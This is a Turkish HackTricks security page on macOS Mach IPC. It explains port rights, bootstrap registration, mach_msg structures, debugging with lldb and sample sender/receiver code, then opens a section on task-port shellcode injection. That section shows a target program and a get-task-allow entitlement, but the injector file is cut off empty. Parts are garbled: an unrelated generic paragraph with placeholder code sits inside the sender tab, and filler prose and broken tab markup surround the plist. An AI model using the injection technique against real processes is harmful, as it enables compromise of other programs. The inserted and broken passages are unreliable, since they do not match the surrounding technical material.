# macOS IPC - İşlem Arası İletişim

<details>

<summary><strong>AWS hackleme konusunda sıfırdan kahramana dönüşün</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong> ile öğrenin!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* 💬 **Discord grubuna** katılın](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)'da **takip edin**.
* **Hacking püf noktalarınızı paylaşarak PR'ler göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>

## Portlar Aracılığıyla Mach Mesajlaşması

### Temel Bilgiler

Mach, kaynakları paylaşmak için **görevleri** en **küçük birim** olarak kullanır ve her görev **çoklu iş parçacığı** içerebilir. Bu **görevler ve iş parçacıkları POSIX işlemleri ve iş parçacıklarıyla 1:1 eşlenir**.

Görevler arasındaki iletişim, Mach İşlem Arası İletişim (IPC) kullanılarak gerçekleşir ve tek yönlü iletişim kanallarını kullanır. **Mesajlar portlar arasında aktarılır** ve bunlar çekirdek tarafından yönetilen **mesaj kuyrukları gibi davranır**.

Bir **port**, Mach IPC'nin temel öğesidir. Bu, **mesaj göndermek ve almak** için kullanılabilir.

Her işlemde bir **IPC tablosu** bulunur ve burada işlemin **mach portları** bulunabilir. Bir mach portun adı aslında bir sayıdır (çekirdek nesnesine işaret eden bir işaretçi).

Bir işlem ayrıca bir port adını bazı haklarla **farklı bir göreve gönderebilir** ve çekirdek bu girişi **diğer görevin IPC tablosuna ekler**.

### Port Hakları

İletişimde önemli olan port hakları, bir görevin yapabileceği işlemleri tanımlar. Mümkün olan **port hakları** şunlardır ([buradan tanımlamalar](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)):

* **Alma hakkı**, porta gönderilen mesajları almayı sağlar. Mach portları MPSC (çoklu üretici, tek tüketici) kuyruklarıdır, bu da sistem genelinde bir port için yalnızca **bir alma hakkının** olabileceği anlamına gelir (borular gibi, birden fazla işlemin aynı borunun okuma ucuna dosya tanımlayıcıları tutabileceği yerde).
* **Alma hakkına sahip bir görev**, mesajları alabilir ve **Gönderme hakları oluşturabilir**, böylece mesaj gönderebilir. Başlangıçta yalnızca **kendi görevi, portunun üzerinde Alma hakkına sahiptir**.
* Alma hakkının sahibi **öldüğünde** veya onu sonlandırdığında, **gönderme hakkı işlevsiz hale gelir (ölü ad)**.
* **Gönderme hakkı**, porta mesaj göndermeyi sağlar.
* Gönderme hakkı **klonlanabilir**, böylece Gönderme hakkına sahip bir görev, hakkı klonlayabilir ve **üçüncü bir göreve verebilir**.
* **Port hakları** ayrıca Mac mesajları aracılığıyla da **geçirilebilir**.
* **Bir kez gönderme hakkı**, porta bir mesaj göndermeyi ve ardından kaybolmayı sağlar.
* Bu hak **klonlanamaz**, ancak **taşınabilir**.
* **Port kümesi hakkı**, yalnızca tek bir port değil bir _port kümesini_ belirtir. Bir port kümesinden bir mesaj çıkarmak, içerdiği portlardan birinden bir mesaj çıkarır. Port kümeleri, Unix'teki `select`/`poll`/`epoll`/`kqueue` gibi aynı anda birkaç porta dinlemek için kullanılabilir.
* **Ölü ad**, gerçek bir port hakkı değil, yalnızca bir yer tutucudur. Bir port yok edildiğinde, portun tüm var olan port hakları ölü adlara dönüşür.

**Görevler, SEND haklarını başkalarına aktarabilir**, böylece onlara geri mesaj gönderme yetkisi verilebilir. **SEND hakları da klonlanabilir**, böylece bir görev hakkı çoğaltabilir ve üçüncü bir göreve verebilir. Bu, **aracı bir süreç olan** **başlangıç sunucusu** ile birlikte, görevler arasında etkili iletişim sağlar.

### Dosya Portları

Dosya portları, dosya tanımlayıcılarını Mac portlarına (Mach port hakları kullanarak) kapsüllüyebilir. Belirli bir FD'den `fileport_makeport` kullanarak bir `fileport` oluşturmak ve bir FD oluşturmak mümkündür.

### İletişim Kurma

Daha önce belirtildiği gibi, Mach mesajları aracılığıyla hakları göndermek mümkündür, ancak **zaten bir Mach mesajı gönderme hakkına sahip olmadan bir hakkı gönderemezsiniz**. Peki, ilk iletişim nasıl kurulur?

Bu durumda, **başlangıç sunucusu** (**mac'te launchd**) devreye girer, çünkü **herkes başlangıç sunucusuna bir SEND hakkı alabilir**, böylece başka bir işleme mesaj gönderme hakkı istenebilir:

1. Görev **A**, **ALMA hakkına sahip yeni bir port oluşturur**.
2. ALMA hakkının sahibi olan Görev **A**, port için **GÖNDERME hakkı oluşturur**.
3. Görev **A**, **başlangıç sunucusu** ile bir **bağlantı kurar** ve başlangıçta oluşturduğu port için **GÖNDERME hakkını sunucuya gönderir**.
* Unutmayın ki herkes başlangıç sunucusuna bir SEND hakkı alabilir.
4. Görev A, başlangıç sunucusuna bir `bootstrap_register` mesajı göndererek, verilen portu `com.apple.taska` gibi bir isimle ilişkilendirir.
5. Görev **B**, hizmet adı için bir başlangıç **araması yapmak üzere** başlangıç sunucusuyla etkileşime girer (`bootstrap_lookup`). Bu nedenle başlangıç sunucusu yanıt verebilsin, görev B, arama mesajı içinde önceden oluşturduğu bir **port için bir SEND hakkı gönderir**. Arama başarılıysa, **sunucu Task A'dan aldığı SEND hakkını kopyalar ve Task B'ye iletir**.
* Unutmayın ki herkes başlangıç sunucusuna bir SEND hakkı alabilir.
6. Bu SEND hakkı ile **Görev B**, **Görev A'ya bir mesaj gönderebilir**.
7. İki yönlü bir iletişim için genellikle görev **B**, bir **ALMA** hakkı ve bir **GÖNDERME** hakkı olan yeni bir port oluşturur ve **Görev A'ya GÖNDERME hakkını verir**, böylece Görev A, GÖREV B'ye mesaj gönderebilir (iki yönlü iletişim).

Başlangıç sunucusu, bir görevin iddia ettiği hizmet adını doğrulayamaz. Bu, bir görevin potansiyel olarak **herhangi bir sistem görevini taklit edebileceği** anlamına gelir, örneğin yanlışlıkla **bir yetkilendirme hizmet adı iddia edebilir ve ardından her isteği onaylayabilir**.

Daha sonra, Apple, **sistem tarafından sağlanan hizmetlerin adlarını** güvenli yapılandırma dosyalarında saklar, bu dosyalar **SIP korumalı** dizinlerde bulunur: `/System/Library/LaunchDaemons` ve `/System/Library/LaunchAgents`. Her hizmet adının yanında **ilişkili ikili dosya da saklanır**. Başlangıç sunucusu, bu hizmet adları için her biri için bir **ALMA hakkı oluşturur ve saklar**.

Bu önceden tanımlanmış hizmetler için, **arama süreci biraz farklıdır**. Bir hizmet adı aranırken, launchd hizmeti dinamik olarak başlatır. Yeni iş akışı şöyle:

* Görev **B**, bir hizmet adı için bir başlangıç **araması başlatır**.
* **launchd**, görevin çalışıp çalışmadığını kontrol eder ve çalışmıyorsa, **başlatır**.
* Görev **A** (hizmet), bir **başlangıç kontrolü yapar** (`bootstrap_check_in()`). Burada, **başlangıç sunucusu bir SEND hakkı oluşturur, saklar ve ALMA hakkını Görev A'ya aktarır**.
* launchd, **SEND hakkını kopyalar ve Görev B'ye gönderir**.
* Görev **B**, bir **ALMA** hakkı ve bir **GÖNDERME** hakkı olan yeni bir port oluşturur ve **Görev A'ya GÖNDERME hakkını verir** (hizmet), böylece Görev A, GÖREV B'ye mesaj gönderebilir (iki yönlü iletişim).

Ancak, bu süreç yalnızca önceden tanımlanmış sistem görevleri için geçerlidir. Sistem dışı görevler hala önceki şekilde çalışır, bu da taklit edilme olasılığına izin verebilir.

{% hint style="danger" %}
Bu nedenle, launchd asla çökmemeli veya tüm sistem çökecektir.
{% endhint %}
### Bir Mach İletisi

[Daha fazla bilgiyi burada bulabilirsiniz](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)

`mach_msg` işlevi, temelde bir sistem çağrısı olan Mach iletilerini göndermek ve almak için kullanılır. İşlev, iletilmesi gereken iletiyi başlangıç argümanı olarak gerektirir. Bu ileti, bir `mach_msg_header_t` yapısı ile başlamalı ve ardından gerçek ileti içeriği gelmelidir. Yapı aşağıdaki gibi tanımlanmıştır:
```c
typedef struct {
mach_msg_bits_t               msgh_bits;
mach_msg_size_t               msgh_size;
mach_port_t                   msgh_remote_port;
mach_port_t                   msgh_local_port;
mach_port_name_t              msgh_voucher_port;
mach_msg_id_t                 msgh_id;
} mach_msg_header_t;
```
İşlemler bir _**alma hakkına**_ sahip olduklarında, bir Mach bağlantı noktasında mesaj alabilirler. Tersine, **gönderenler** bir _**gönderme hakkı**_ veya bir _**bir kez gönderme hakkı**_ alırlar. Bir kez gönderme hakkı yalnızca bir mesaj göndermek için kullanılır, ardından geçersiz hale gelir.

Başlangıç alanı **`msgh_bits`** bir bit haritasıdır:

* İlk bit (en anlamlı) bir mesajın karmaşık olduğunu belirtmek için kullanılır (aşağıda daha fazla bilgi)
* 3. ve 4. bitler çekirdek tarafından kullanılır
* 2. baytın **en az 5 anlamlı bits**i **fiş**: başka bir tür anahtar/değer kombinasyonu göndermek için kullanılabilir.
* 3. baytın **en az 5 anlamlı bits**i **yerel bağlantı noktası** için kullanılabilir
* 4. baytın **en az 5 anlamlı bits**i **uzak bağlantı noktası** için kullanılabilir

Fiş, yerel ve uzak bağlantı noktalarında belirtilebilecek türler [**mach/message.h**](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html) adresinden alınabilir:
```c
#define MACH_MSG_TYPE_MOVE_RECEIVE      16      /* Must hold receive right */
#define MACH_MSG_TYPE_MOVE_SEND         17      /* Must hold send right(s) */
#define MACH_MSG_TYPE_MOVE_SEND_ONCE    18      /* Must hold sendonce right */
#define MACH_MSG_TYPE_COPY_SEND         19      /* Must hold send right(s) */
#define MACH_MSG_TYPE_MAKE_SEND         20      /* Must hold receive right */
#define MACH_MSG_TYPE_MAKE_SEND_ONCE    21      /* Must hold receive right */
#define MACH_MSG_TYPE_COPY_RECEIVE      22      /* NOT VALID */
#define MACH_MSG_TYPE_DISPOSE_RECEIVE   24      /* must hold receive right */
#define MACH_MSG_TYPE_DISPOSE_SEND      25      /* must hold send right(s) */
#define MACH_MSG_TYPE_DISPOSE_SEND_ONCE 26      /* must hold sendonce right */
```
Örneğin, `MACH_MSG_TYPE_MAKE_SEND_ONCE`, bu bağlantı noktası için türetilmiş ve aktarılmış bir **gönderme-bir-kez** **hakkının** belirtildiğini göstermek için kullanılabilir. Alıcı yanıt göndermesin diye `MACH_PORT_NULL` belirtilebilir.

Kolay **iki yönlü iletişim** sağlamak için bir işlem, _yanıt bağlantı noktası_ (**`msgh_local_port`**) olarak adlandırılan bir mach **ileti başlığı** içinde bir **mach bağlantı noktası** belirtebilir, mesajın **alıcısı** bu iletiye yanıt gönderebilir.

{% hint style="success" %}
Bu tür iki yönlü iletişimin XPC iletilerinde kullanıldığını unutmayın (`xpc_connection_send_message_with_reply` ve `xpc_connection_send_message_with_reply_sync`). Ancak genellikle farklı bağlantı noktaları oluşturulur, önceki açıklandığı gibi iki yönlü iletişimi oluşturmak için.
{% endhint %}

İleti başlığının diğer alanları şunlardır:

- `msgh_size`: tüm paketin boyutu.
- `msgh_remote_port`: bu ileti gönderilen bağlantı noktası.
- `msgh_voucher_port`: [mach fişleri](https://robert.sesek.com/2023/6/mach\_vouchers.html).
- `msgh_id`: bu iletiğin alıcı tarafından yorumlanan kimliği.

{% hint style="danger" %}
**Mach iletileri**, mach çekirdeğine yerleştirilmiş **tek alıcı**, **çoklu gönderen** iletişim kanalı olan bir `mach bağlantı noktası` üzerinden gönderilir. **Birden fazla işlem**, bir mach bağlantı noktasına **ileti gönderebilir**, ancak herhangi bir anda yalnızca **bir işlem** ondan okuyabilir.
{% endhint %}

İletiler daha sonra **`mach_msg_header_t`** başlığı, ardından **gövde** ve **trailer** (varsa) ile oluşturulur ve yanıt verme izni verebilir. Bu durumlarda, çekirdek sadece iletiyi bir görevden diğerine iletmek zorundadır.

Bir **trailer**, **çekirdek tarafından iletiye eklenen bilgi**dir (kullanıcı tarafından ayarlanamaz) ve ileti alımında `MACH_RCV_TRAILER_<trailer_opt>` bayrakları ile istenebilir (istenebilecek farklı bilgiler vardır).

#### Karmaşık İletiler

Ancak, ek port hakları geçiren veya belleği paylaşan daha **karmaşık** iletiler gibi diğer iletiler de vardır, burada çekirdek bu nesneleri alıcıya göndermek zorundadır. Bu durumlarda, başlık `msgh_bits`'in en anlamlı biti ayarlanır.

Geçirilebilecek olası tanımlayıcılar [**`mach/message.h`**](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html) içinde tanımlanmıştır:
```c
#define MACH_MSG_PORT_DESCRIPTOR                0
#define MACH_MSG_OOL_DESCRIPTOR                 1
#define MACH_MSG_OOL_PORTS_DESCRIPTOR           2
#define MACH_MSG_OOL_VOLATILE_DESCRIPTOR        3
#define MACH_MSG_GUARDED_PORT_DESCRIPTOR        4

#pragma pack(push, 4)

typedef struct{
natural_t                     pad1;
mach_msg_size_t               pad2;
unsigned int                  pad3 : 24;
mach_msg_descriptor_type_t    type : 8;
} mach_msg_type_descriptor_t;
```
### Mac Port API'leri

Portların görev alanıyla ilişkilendirildiğini unutmayın, bu nedenle bir port oluşturmak veya aramak için görev alanı da sorgulanır (`mach/mach_port.h` içinde daha fazla bilgi):

- **`mach_port_allocate` | `mach_port_construct`**: Bir port oluşturur.
- `mach_port_allocate` ayrıca bir **port seti** oluşturabilir: bir grup port üzerinde alınan hak. Bir mesaj alındığında, mesajın nereden geldiği belirtilir.
- `mach_port_allocate_name`: Portun adını değiştirir (varsayılan olarak 32 bitlik tamsayı).
- `mach_port_names`: Bir hedeften port adlarını alır.
- `mach_port_type`: Bir görevin bir ada sahip olma haklarını alır.
- `mach_port_rename`: Bir portun adını değiştirir (FD'ler için dup2 gibi).
- `mach_port_allocate`: YENİ ALMA, PORT_SET veya DEAD_NAME oluşturur.
- `mach_port_insert_right`: ALMA hakkına sahip olduğunuz bir portta yeni bir hak oluşturur.
- `mach_port_...`
- **`mach_msg`** | **`mach_msg_overwrite`**: Mach mesajları göndermek ve almak için kullanılan işlevler. Üzerine yazma sürümü, mesaj alımı için farklı bir tampon belirtmeyi sağlar (diğer sürüm sadece yeniden kullanır).

### Debug mach\_msg

`mach_msg` ve `mach_msg_overwrite` işlevlerinin gönderme ve alma işlemlerinde kullanıldığı için bunlara bir kesme noktası ayarlamak, gönderilen ve alınan mesajları incelemeyi sağlar.

Örneğin, bu işlevi kullanan **`libSystem.B`'yi yükleyecek bir uygulamayı hata ayıklamaya başlayın**.

<pre class="language-armasm"><code class="lang-armasm"><strong>(lldb) b mach_msg
</strong>Kesme Noktası 1: nerede = libsystem_kernel.dylib`mach_msg, adres = 0x00000001803f6c20
<strong>(lldb) r
</strong>İşlem 71019 başlatıldı: '/Users/carlospolop/Desktop/sandboxedapp/SandboxedShellAppDown.app/Contents/MacOS/SandboxedShellApp' (arm64)
İşlem 71019 durduruldu
* thread #1, queue = 'com.apple.main-thread', duraklama nedeni = kesme noktası 1.1
frame #0: 0x0000000181d3ac20 libsystem_kernel.dylib`mach_msg
libsystem_kernel.dylib`mach_msg:
->  0x181d3ac20 &#x3C;+0>:  pacibsp
0x181d3ac24 &#x3C;+4>:  sub    sp, sp, #0x20
0x181d3ac28 &#x3C;+8>:  stp    x29, x30, [sp, #0x10]
0x181d3ac2c &#x3C;+12>: add    x29, sp, #0x10
Hedef 0: (SandboxedShellApp) durdu.
<strong>(lldb) bt
</strong>* thread #1, queue = 'com.apple.main-thread', duraklama nedeni = kesme noktası 1.1
* frame #0: 0x0000000181d3ac20 libsystem_kernel.dylib`mach_msg
frame #1: 0x0000000181ac3454 libxpc.dylib`_xpc_pipe_mach_msg + 56
frame #2: 0x0000000181ac2c8c libxpc.dylib`_xpc_pipe_routine + 388
frame #3: 0x0000000181a9a710 libxpc.dylib`_xpc_interface_routine + 208
frame #4: 0x0000000181abbe24 libxpc.dylib`_xpc_init_pid_domain + 348
frame #5: 0x0000000181abb398 libxpc.dylib`_xpc_uncork_pid_domain_locked + 76
frame #6: 0x0000000181abbbfc libxpc.dylib`_xpc_early_init + 92
frame #7: 0x0000000181a9583c libxpc.dylib`_libxpc_initializer + 1104
frame #8: 0x000000018e59e6ac libSystem.B.dylib`libSystem_initializer + 236
frame #9: 0x0000000181a1d5c8 dyld`invocation function for block in dyld4::Loader::findAndRunAllInitializers(dyld4::RuntimeState&#x26;) const::$_0::operator()() const + 168
</code></pre>

**`mach_msg`**'nin argümanlarını almak için kayıtları kontrol edin. Bunlar argümanlardır ([mach/message.h](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html) adresinden):
```c
__WATCHOS_PROHIBITED __TVOS_PROHIBITED
extern mach_msg_return_t        mach_msg(
mach_msg_header_t *msg,
mach_msg_option_t option,
mach_msg_size_t send_size,
mach_msg_size_t rcv_size,
mach_port_name_t rcv_name,
mach_msg_timeout_t timeout,
mach_port_name_t notify);
```
Kayıtlardan değerleri alın:
```armasm
reg read $x0 $x1 $x2 $x3 $x4 $x5 $x6
x0 = 0x0000000124e04ce8 ;mach_msg_header_t (*msg)
x1 = 0x0000000003114207 ;mach_msg_option_t (option)
x2 = 0x0000000000000388 ;mach_msg_size_t (send_size)
x3 = 0x0000000000000388 ;mach_msg_size_t (rcv_size)
x4 = 0x0000000000001f03 ;mach_port_name_t (rcv_name)
x5 = 0x0000000000000000 ;mach_msg_timeout_t (timeout)
x6 = 0x0000000000000000 ;mach_port_name_t (notify)
```
İlk argümanı kontrol ederek mesaj başlığını inceleyin:
```armasm
(lldb) x/6w $x0
0x124e04ce8: 0x00131513 0x00000388 0x00000807 0x00001f03
0x124e04cf8: 0x00000b07 0x40000322

; 0x00131513 -> mach_msg_bits_t (msgh_bits) = 0x13 (MACH_MSG_TYPE_COPY_SEND) in local | 0x1500 (MACH_MSG_TYPE_MAKE_SEND_ONCE) in remote | 0x130000 (MACH_MSG_TYPE_COPY_SEND) in voucher
; 0x00000388 -> mach_msg_size_t (msgh_size)
; 0x00000807 -> mach_port_t (msgh_remote_port)
; 0x00001f03 -> mach_port_t (msgh_local_port)
; 0x00000b07 -> mach_port_name_t (msgh_voucher_port)
; 0x40000322 -> mach_msg_id_t (msgh_id)
```
O tür `mach_msg_bits_t`, bir yanıtı izin vermek için çok yaygındır.



### Bağlantı noktalarını sırala
```bash
lsmp -p <pid>

sudo lsmp -p 1
Process (1) : launchd
name      ipc-object    rights     flags   boost  reqs  recv  send sonce oref  qlimit  msgcount  context            identifier  type
---------   ----------  ----------  -------- -----  ---- ----- ----- ----- ----  ------  --------  ------------------ ----------- ------------
0x00000203  0x181c4e1d  send        --------        ---            2                                                  0x00000000  TASK-CONTROL SELF (1) launchd
0x00000303  0x183f1f8d  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x00000403  0x183eb9dd  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x0000051b  0x1840cf3d  send        --------        ---            2        ->        6         0  0x0000000000000000 0x00011817  (380) WindowServer
0x00000603  0x183f698d  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x0000070b  0x175915fd  recv,send   ---GS---     0  ---      1     2         Y        5         0  0x0000000000000000
0x00000803  0x1758794d  send        --------        ---            1                                                  0x00000000  CLOCK
0x0000091b  0x192c71fd  send        --------        D--            1        ->        1         0  0x0000000000000000 0x00028da7  (418) runningboardd
0x00000a6b  0x1d4a18cd  send        --------        ---            2        ->       16         0  0x0000000000000000 0x00006a03  (92247) Dock
0x00000b03  0x175a5d4d  send        --------        ---            2        ->       16         0  0x0000000000000000 0x00001803  (310) logd
[...]
0x000016a7  0x192c743d  recv,send   --TGSI--     0  ---      1     1         Y       16         0  0x0000000000000000
+     send        --------        ---            1         <-                                       0x00002d03  (81948) seserviced
+     send        --------        ---            1         <-                                       0x00002603  (74295) passd
[...]
```
**İsim**, bağlantı noktasına verilen varsayılan addır (ilk 3 baytının nasıl **arttığını** kontrol edin). **`ipc-object`** ise bağlantı noktasının **şifrelenmiş** benzersiz **tanımlayıcısıdır**.\
Ayrıca, yalnızca **`send`** hakkına sahip bağlantı noktalarının sahibini belirlediğine dikkat edin (bağlantı noktası adı + pid).\
Ayrıca, **diğer görevlere bağlı** olduğunu belirtmek için **`+`** işaretinin kullanımına dikkat edin.

Ayrıca, [**procesxp**](https://www.newosxbook.com/tools/procexp.html) kullanarak **kayıtlı hizmet adlarını** görmek de mümkündür (SIP devre dışı bırakıldığında `com.apple.system-task-port` gerektiği için):
```
procesp 1 ports
```
Bu aracı iOS'a [http://newosxbook.com/tools/binpack64-256.tar.gz](http://newosxbook.com/tools/binpack64-256.tar.gz) adresinden indirerek yükleyebilirsiniz.

### Kod örneği

**Gönderici**nin nasıl bir bağlantı noktası tahsis ettiğine, `org.darlinghq.example` adı için bir **gönderme hakkı** oluşturduğuna ve bunu **önyükleme sunucusuna** gönderdiğine dikkat edin, gönderici bu adın **gönderme hakkını** istedi ve bunu kullanarak bir **mesaj gönderdi**.

{% tabs %}
{% tab title="receiver.c" %}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc receiver.c -o receiver

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Create a new port.
mach_port_t port;
kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
if (kr != KERN_SUCCESS) {
printf("mach_port_allocate() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_allocate() created port right name %d\n", port);


// Give us a send right to this port, in addition to the receive right.
kr = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
if (kr != KERN_SUCCESS) {
printf("mach_port_insert_right() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_insert_right() inserted a send right\n");


// Send the send right to the bootstrap server, so that it can be looked up by other processes.
kr = bootstrap_register(bootstrap_port, "org.darlinghq.example", port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_register() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_register()'ed our port\n");


// Wait for a message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
mach_msg_trailer_t trailer;
} message;

kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_RCV_MSG,     // Options. We're receiving a message.
0,                // Size of the message being sent, if sending.
sizeof(message),  // Size of the buffer for receiving.
port,             // The port to receive a message on.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Got a message\n");

message.some_text[9] = 0;
printf("Text: %s, number: %d\n", message.some_text, message.some_number);
}
```
{% endtab %}

{% tab title="sender.c" %} 

## macOS IPC (Inter-Process Communication)

Bu bölümde, macOS'ta IPC'nin (İşlem Arası İletişim) nasıl kötüye kullanılabileceğini ve bir saldırganın bu yöntemi kullanarak ayrıcalık yükseltme saldırıları gerçekleştirebileceğini öğreneceksiniz.

IPC, farklı işlemler arasında veri iletişimi sağlayan bir mekanizmadır ve kötü niyetli bir saldırganın bu mekanizmayı istismar ederek hedef sisteme zarar verebileceği bir saldırı vektörü olabilir.

Bu bölümde, IPC'nin nasıl çalıştığını anlayacak ve güvenlik önlemleri alarak macOS sistemlerinizde IPC kötüye kullanımını nasıl engelleyebileceğinizi öğreneceksiniz. 

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <mach/mach.h>
#include <mach/message.h>

int main() {
    mach_port_t server_port;
    mach_port_t client_port;
    mach_msg_header_t msg;

    // IPC kodları buraya eklenecek

    return 0;
}
```

Bu örnek, basit bir IPC senaryosunu göstermektedir. Saldırganlar, bu tür IPC mekanizmalarını kötüye kullanarak hedef sistemde istenmeyen işlemler gerçekleştirebilirler. Güvenlik önlemleri almak, IPC kötüye kullanımını önlemek için önemlidir. 

{% endtab %}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc sender.c -o sender

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Lookup the receiver port using the bootstrap server.
mach_port_t port;
kern_return_t kr = bootstrap_look_up(bootstrap_port, "org.darlinghq.example", &port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_look_up() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_look_up() returned port right name %d\n", port);


// Construct our message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
} message;

message.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
message.header.msgh_remote_port = port;
message.header.msgh_local_port = MACH_PORT_NULL;

strncpy(message.some_text, "Hello", sizeof(message.some_text));
message.some_number = 35;

// Send the message.
kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_SEND_MSG,    // Options. We're sending a message.
sizeof(message),  // Size of the message being sent.
0,                // Size of the buffer for receiving.
MACH_PORT_NULL,   // A port to receive a message on, if receiving.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Sent a message\n");
}
```
{% endtab %}
{% endtabs %}

### Ayrıcalıklı Portlar

* **Ana port**: Bir işlem bu porta **Gönderme** ayrıcalığına sahipse, **sistem** hakkında **bilgi** alabilir (örneğin, `host_processor_info`).
* **Ana ayrıcalıklı port**: Bu porta **Gönderme** hakkı olan bir işlem, bir çekirdek uzantısını yükleme gibi **ayrıcalıklı eylemler** gerçekleştirebilir. Bu izne sahip olmak için **işlemin kök olması** gerekir.
* Ayrıca, **`kext_request`** API'sını çağırmak için yalnızca Apple ikili dosyalarına verilen **`com.apple.private.kext*`** gibi diğer ayrıcalıklara sahip olmak gerekmektedir.
* **Görev adı portu:** _Görev portu_ nun ayrıcalıksız bir sürümüdür. Görevi referans alır, ancak kontrol etmeye izin vermez. Yalnızca üzerinden `task_info()` işlemi yapılabilen şey budur.
* **Görev portu** (ayrıca çekirdek portu olarak da bilinir)**:** Bu porta gönderme izni ile görevi kontrol etmek mümkündür (belleği okuma/yazma, iş parçacığı oluşturma...).
* **Çağıran görev için bu portun adını almak** için `mach_task_self()` işlemini çağırın. Bu port yalnızca **`exec()`** işlemi sırasında **miras alınır**; `fork()` ile oluşturulan yeni bir görev, yeni bir görev portu alır (`exec()` işleminden sonra bir suid ikili dosyada da bir görev yeni bir görev portu alır). Bir görevi başlatmak ve portunu almanın tek yolu, `fork()` işlemi sırasında ["port takası dansını"](https://robert.sesek.com/2014/1/changes\_to\_xnu\_mach\_ipc.html) gerçekleştirmektir.
* Bu porta erişim kısıtlamaları (binary `AppleMobileFileIntegrity`'den `macos_task_policy` üzerinden):
* Uygulamanın **`com.apple.security.get-task-allow` ayrıcalığı** varsa, aynı kullanıcıdan işlemler görev portuna erişebilir (genellikle hata ayıklama için Xcode tarafından eklenir). **Notarizasyon** işlemi bunu üretim sürümlerine izin vermez.
* **`com.apple.system-task-ports`** ayrıcalığına sahip uygulamalar, çekirdek hariç, herhangi bir işlemin **görev portunu alabilir**. Daha eski sürümlerde **`task_for_pid-allow`** olarak adlandırılıyordu. Bu yalnızca Apple uygulamalarına verilir.
* **Kök**, **sıkılaştırılmış** bir çalışma zamanı ile derlenmemiş uygulamaların görev portlarına erişebilir (ve Apple'dan olmayanlar). 

### Görev portu aracılığıyla İş Parçacığına Shellcode Enjeksiyonu

Shellcode'u aşağıdaki yerden alabilirsiniz:

{% content-ref url="../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md" %}
[arm64-basic-assembly.md](../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md)
{% endcontent-ref %}
```objectivec
// clang -framework Foundation mysleep.m -o mysleep
// codesign --entitlements entitlements.plist -s - mysleep

#import <Foundation/Foundation.h>

double performMathOperations() {
double result = 0;
for (int i = 0; i < 10000; i++) {
result += sqrt(i) * tan(i) - cos(i);
}
return result;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
NSLog(@"Process ID: %d", [[NSProcessInfo processInfo]
processIdentifier]);
while (true) {
[NSThread sleepForTimeInterval:5];

performMathOperations();  // Silent action

[NSThread sleepForTimeInterval:5];
}
}
return 0;
}
```
{% endtab %}

{% tab title="entitlements.plist" %}Bu dosya, uygulamanın hangi özel yetkilere sahip olduğunu belirten bir Property List dosyasıdır. Uygulamanın sistem kaynaklarına erişim düzeyini belirler ve güvenlik politikalarını uygular. Bu dosya, uygulamanın hangi işlemleri yapabileceğini ve hangi kaynaklara erişebileceğini tanımlar. Bu nedenle, bu dosyanın doğru bir şekilde yapılandırılması, güvenlik açıklarını önlemek için önemlidir. %}
```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.get-task-allow</key>
<true/>
</dict>
</plist>
```
{% endtab %}
{% endtabs %}

Önceki programı **derleyin** ve aynı kullanıcıyla kod enjekte etmek için **yetkileri** ekleyin (aksi halde **sudo** kullanmanız gerekecektir).

<details>

<summary>sc_injector.m</summary>
```objectivec
